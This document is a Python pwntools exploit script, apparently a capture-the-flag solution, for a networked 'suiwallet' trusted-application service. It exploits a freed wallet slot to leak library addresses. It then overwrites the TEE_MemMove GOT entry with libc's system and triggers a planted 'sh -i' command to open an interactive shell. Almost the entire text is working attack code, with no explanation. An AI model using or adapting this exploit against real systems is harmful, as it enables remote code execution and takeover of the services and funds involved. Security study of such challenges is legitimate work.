#!/usr/bin/env python3
from pwn import *
import os


HOST = args.HOST or "127.0.0.1"
PORT = int(args.PORT or 9999)
HERE = os.path.dirname(os.path.realpath(__file__))
ta = ELF(os.path.join(HERE, "suiwallet_ta.so"), checksec=False)
libc = ELF(os.path.join(HERE, "libc.so.6"), checksec=False)


def cmd(line):
    io.sendline(line)
    return io.recvuntil(b"suiwallet> ", drop=True)


def session():
    line = cmd(b"session").decode().splitlines()[0]
    fields = dict(x.split("=") for x in line.split())
    return int(fields["owner"], 0)


def create(name, balance, note):
    out = cmd(f"create {name} {balance} {note}".encode()).decode()
    return int(out.split("=", 1)[1])


def delete(slot, owner):
    cmd(f"delete {slot} {owner}".encode())


def stage(index, slot, owner, amount, counterparty, memo):
    cmd(f"stage-entry {index} {slot} {owner} {amount} {counterparty} {memo}".encode())


def prepare(base, count, source, memo):
    cmd(f"prepare-batch {base} {count} {source} {memo}".encode())


def show_batch(slot, owner, index):
    lines = cmd(f"show-batch {slot} {owner} {index}".encode()).splitlines()
    raw = bytes.fromhex(next(x[4:].decode() for x in lines if x.startswith(b"raw=")))
    return u64(raw[:8]), u64(raw[8:16])


def settle(slot, owner, dst, source):
    cmd(f"settle-batch {slot} {owner} {dst:#x} {source}".encode())


def main():
    global io
    io = remote(HOST, PORT)
    io.recvuntil(b"suiwallet> ")
    owner = session()

    command_slot = create("opsvault", 31337, "sh -i <$I >$O 2>$O")
    stale_slot = create("coldpool", 1, "reclaim-me")
    delete(stale_slot, owner)

    stage(0, 0x41414141, 0x42424242, 0x1337, "seedpeer", "seed")
    prepare(0, 1, stale_slot, "nightly-export")
    leaked_render, leaked_puts = show_batch(stale_slot, owner, 1)

    ta_base = leaked_render - ta.symbols["wallet_render"]
    libc_base = leaked_puts - libc.symbols["puts"]
    memmove_got = ta_base + ta.got["TEE_MemMove"]
    system = libc_base + libc.symbols["system"]

    stage(0, system & 0xffffffff, system >> 32, 0, "overwrite", "pivot")
    settle(stale_slot, owner, memmove_got, 0)

    io.sendline(f"show {command_slot} {owner}".encode())
    io.recvuntil(b"$ ")
    io.interactive()


if __name__ == "__main__":
    main()
